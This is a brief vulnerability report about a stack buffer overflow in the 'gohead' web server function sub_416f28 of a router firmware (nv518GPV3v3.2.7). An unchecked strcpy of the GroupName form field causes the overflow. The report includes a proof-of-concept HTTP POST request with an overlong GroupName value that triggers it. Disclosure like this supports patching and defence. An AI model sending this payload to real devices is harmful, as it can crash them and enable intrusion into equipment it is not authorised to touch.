# FUN_00416f28 漏洞信息

## 基础信息
- **影响组件**: /gohead/sub_416f28
- **固件版本**: nv518GPV3v3.2.7-210919-162004

## 漏洞详情

![image](image.png)

gohead/sub_416f28

When executing strcpy(InstPointByIndex + 180, v15);, the buffer size is not checked. The user-modified GroupName value is passed to this location, and an overly large value will cause a stack overflow.

poc：

```
POST gohead/sub_416f28 HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/first.asp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

GroupName=111111111111111111111111111111111111111111111111111111111111111111111111
```